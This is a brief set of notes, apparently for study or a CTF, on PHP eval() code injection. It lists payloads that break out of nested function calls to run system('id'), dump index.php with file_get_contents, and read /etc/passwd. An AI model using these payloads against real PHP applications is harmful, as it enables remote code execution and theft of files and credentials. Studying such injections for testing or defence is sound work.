```php
<?php print(md5($_REQUEST['name'])); ?>  #safe
input -> shell -> safe
input -> eval  -> command injection -> test #' & "
eval -> <?php f1(f2(f3( ... $_POST['name' ]))); ?>
# ');#   x
# '));#  +
# ')));# x
#...
''));system('id');#'
#eval code mizane be hamon zaban

'');print(file_get_contents('index.php'));#'

${}
${cat /etc/passwd}
${print(echo $((98+83)))}

```